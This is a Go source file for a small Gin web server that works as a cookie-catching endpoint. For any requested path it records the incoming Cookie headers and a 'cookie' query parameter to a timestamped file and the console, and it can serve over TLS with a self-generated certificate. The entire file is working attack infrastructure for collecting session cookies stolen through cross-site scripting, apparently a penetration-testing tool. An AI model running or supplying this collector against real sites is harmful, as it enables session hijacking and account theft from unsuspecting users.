package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"flag"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/golang/glog"
)

func main() {

	var (
		useTLS   bool
		hostname string
		port     int
	)

	flag.BoolVar(&useTLS, "ssl", true, "Use SSL")
	flag.StringVar(&hostname, "hostname", "localhost", "Hostname for the server")
	flag.IntVar(&port, "port", 443, "Port to listen on")
	flag.Parse()

	r := gin.Default()

	fileName := fmt.Sprintf("cookies_%s_%d_%s.txt", hostname, port, strconv.FormatInt(time.Now().UTC().UnixNano(), 10))

	// Ping handler
	r.GET("/*page", func(c *gin.Context) {
		p := c.Param("page")
		val := c.Request.Header["Cookie"]

		f, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		defer f.Close()

		if err != nil {
			glog.Warning("Cannot open cookies file")
		}

		// Get time
		t := time.Now()
		l := fmt.Sprintf("\n\n--- Page: %s ---\n", p)
		fmt.Println(l)
		f.Write([]byte(l))

		for _, cookie := range val {
			l = fmt.Sprintf("\n--- %s ---\nCookie (Header): %s\n", t, cookie)
			fmt.Println(l)
			f.Write([]byte(l))
		}

		cookie := c.Query("cookie")
		l = fmt.Sprintf("\n--- %s ---\nCookie (Param): %s\n", t, cookie)
		fmt.Println(l)
		f.Write([]byte(l))
		if err != nil {
			glog.Fatal("Error writing to file")
		}
	})

	hostAddr := fmt.Sprintf("%s:%d", hostname, port)

	if useTLS {
		cert := &x509.Certificate{
			SerialNumber: big.NewInt(1658),
			Subject: pkix.Name{
				Organization:  []string{"MantisSTS"},
				Country:       []string{"UK"},
				Province:      []string{"Devon"},
				Locality:      []string{"Plymouth"},
				StreetAddress: []string{"MantisSTS"},
				PostalCode:    []string{"MantisSTS"},
			},
			NotBefore:    time.Now(),
			NotAfter:     time.Now().AddDate(10, 0, 0),
			SubjectKeyId: []byte{1, 2, 3, 4, 6},
			ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			KeyUsage:     x509.KeyUsageDigitalSignature,
		}
		priv, _ := rsa.GenerateKey(rand.Reader, 2048)
		pub := &priv.PublicKey

		// Sign the certificate
		certificate, _ := x509.CreateCertificate(rand.Reader, cert, cert, pub, priv)

		certBytes := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certificate})
		keyBytes := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

		// Generate a key pair from your pem-encoded cert and key ([]byte).
		x509Cert, _ := tls.X509KeyPair(certBytes, keyBytes)

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{x509Cert}}
		server := http.Server{Addr: hostAddr, Handler: r, TLSConfig: tlsConfig}

		glog.Fatal(server.ListenAndServeTLS("", ""))
	} else {
		r.Run(hostAddr)
	}
}
